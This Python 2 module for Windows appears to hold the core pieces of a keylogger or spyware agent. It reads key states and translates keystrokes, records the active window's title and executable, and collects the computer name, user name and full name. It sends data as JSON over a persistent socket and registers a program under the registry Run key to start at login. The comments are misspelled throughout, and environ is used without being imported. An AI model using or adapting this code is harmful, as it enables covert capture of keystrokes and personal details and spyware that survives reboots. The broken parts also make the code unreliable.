import _winreg as winreg
from ctypes import *
from threading import Thread
import win32api
import win32process
import win32con
from socket import *
import struct
from pyHook import GetKeyState, HookConstants
from collections import OrderedDict
from platform import platform
from time import time
import ujson

launch = int(time())
user32 = windll.user32


class Event:
    """
    Object styled dictionary for clearer code
    """

    def __init__(self, **entries): self.__dict__.update(entries)

    def __eq__(self, other): return self.__dict__ == other.__dict__

    def __neq__(self, other): return self.__dict__ != other.__dict__


def set_keepalive(sock):
    """
    Toggle on the keepalibe flag of input socket

    Args:
        sock: input socket to alter
    """
    sock.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)


class Message_socket(socket):
    """
    A message-based socket
    """

    def send_msg(self, msg):
        """
        Sends a message padded with its size

        Args:
           msg: message to send
        """
        msg = struct.pack('!I', len(msg)) + msg
        self.sendall(msg)

    def send_json(self, data):
        """
        Sends a json message padded with its size

        Args:
           msg: json to send
        """
        self.send_msg(ujson.dumps(data))

    def recv_msg(self):
        """
        Reciebes a message that's padded with its size

        Returns:
            The sent message
        """
        raw_msglen = self.recvall(struct.calcsize('!I'))
        if not raw_msglen:
            return None
        msglen = struct.unpack('!I', raw_msglen)[0]
        return self.recvall(msglen)

    def recv_json(self):
        """
        Reciebes a json message

        Returns:
            The sent json
        """
        return ujson.loads(self.recv_msg())

    def recvall(self, n):
        """
        Reciebes n bytes from the connection

        Args:
            n: number of bytes to read
        """
        data = ''
        while len(data) < n:
            packet = self.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data


def ToUnicode(vk):
    """
    Translates the birtual key code into a unicode character using the user's current keyboard locale

    Args:
        vk: the input birtual key code

    Returns:
        Unicode localed representation of the birtual key code
    """
    def _ToUnicode(results):
        b = create_unicode_buffer(256)
        results["code"] = user32.ToUnicode(
            vk, 0, win32api.GetKeyboardState(), b, 256, 0)
        results["char"] = b.value.encode("utf-8")
    results = {}
    t = Thread(target=_ToUnicode, args=(results,))
    t.start()
    t.join()
    return results


def get_exe_description(windows_exe):
    try:
        language, codepage = win32api.GetFileVersionInfo(
            windows_exe, '\\VarFileInfo\\Translation')[0]
        stringFileInfo = u'\\StringFileInfo\\%04X%04X\\%s' % (
            language, codepage, "FileDescription")
        description = win32api.GetFileVersionInfo(windows_exe, stringFileInfo)
    except:
        description = None
    return description


def get_computer_info():
    return {"computer": environ['COMPUTERNAME'], "user": environ['USERNAME'], "os": platform(), "full_name": win32api.GetUserNameEx(3), "launch_time": launch}


def get_modifiers():
    """
    Gets actibe keyboard modifier keys

    Returns:
        A dictionary containing the states of CTRL SHIFT and ALT
    """
    ctrl_pressed = bool(GetKeyState(
        HookConstants.VKeyToID('VK_CONTROL')) >> 7)
    alt_pressed = bool(GetKeyState(
        HookConstants.VKeyToID('VK_MENU')) >> 7)
    shift_pressed = bool(GetKeyState(
        HookConstants.VKeyToID('VK_SHIFT')) >> 7)
    return OrderedDict([("ctrl", ctrl_pressed), ("shift", shift_pressed), ("alt", alt_pressed)])


def GetWindowTextW(hwnd):
    """
    Gets the unicode title of a window

    Args:
        hwnd: handle to the window

    Returns:
        Unicode title
    """
    length = user32.GetWindowTextLengthW(hwnd)
    buff = create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buff, length + 1)
    return buff.value.encode("utf-8")


def get_window_executable(hwnd):
    """
    Gets the process executable of a window

    Args:
       hwnd: handle to the window

    Returns:
       executable path
    """
    pid = win32process.GetWindowThreadProcessId(hwnd)[1]
    proc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
    return win32process.GetModuleFileNameEx(proc, 0)


def register_startup(name, path):
    """
    Registers a program to run on startup

    Args:
        name: the giben name to the startup object
        path: path to the file to startup
    """
    winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
                                     winreg.KEY_ALL_ACCESS), name, 1, winreg.REG_SZ, '"%s"' % path)
